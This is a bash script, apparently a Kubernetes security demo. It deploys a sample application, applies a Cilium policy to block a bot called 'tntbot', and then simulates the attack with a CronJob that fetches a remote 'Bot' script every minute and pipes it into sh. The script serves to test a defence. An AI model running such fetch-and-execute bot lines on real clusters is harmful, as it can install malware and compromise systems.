#! /bin/bash
green=`tput setaf 2`
reset=`tput sgr0`
#storing namespace value to variable ns
ns="tntbot" 

if [[ -z $(kubectl get ns | grep $ns) ]]
then
  	kubectl create ns $ns
  	sleep 2
else
	echo "${green}Namespace '$ns' found${reset}"
fi

#Deploy sample application in namespace
kubectl apply -f https://raw.githubusercontent.com/nandakrr/TNTbotinger/main/TNTBot-deploy.yaml -n $ns
echo "${green}Application is deployed in namespace $ns ${reset}"

#wait until service ip is ready

while true
do
   if [[ -z $(kubectl get svc -n $ns | awk '{print $4}' | grep -i pending) ]]
   then
      break
   fi
done

#apply the policy to block tntbot
echo "${green}Applying the policy to block tntbot"
kubectl apply -f https://raw.githubusercontent.com/nandakrr/TNTbotinger/main/TNTBot-cilium-policy.yaml -n $ns
echo $ns
#Do the attack with a cron job
cat <<EOF | kubectl apply -f -
apiVersion: batch/v1
kind: CronJob
metadata:
  name: tntbot-cron
  namespace: $ns
spec:
  schedule: "*/1 * * * *"
  successfulJobsHistoryLimit: 0
  failedJobsHistoryLimit: 0
  jobTemplate:
    spec:
      template:
        metadata:
          labels:
            container: curl
        spec:
          containers:
          - name: curl
            image: alpine/curl
            imagePullPolicy: IfNotPresent
            command:
            - /bin/sh
            - -c
            - curl -Ls https://raw.githubusercontent.com/accuknox/samples/main/tntbot/Bot | sh
          restartPolicy: OnFailure
EOF
echo "${green}cronjob created for tntbot at 1 min interval${reset}"
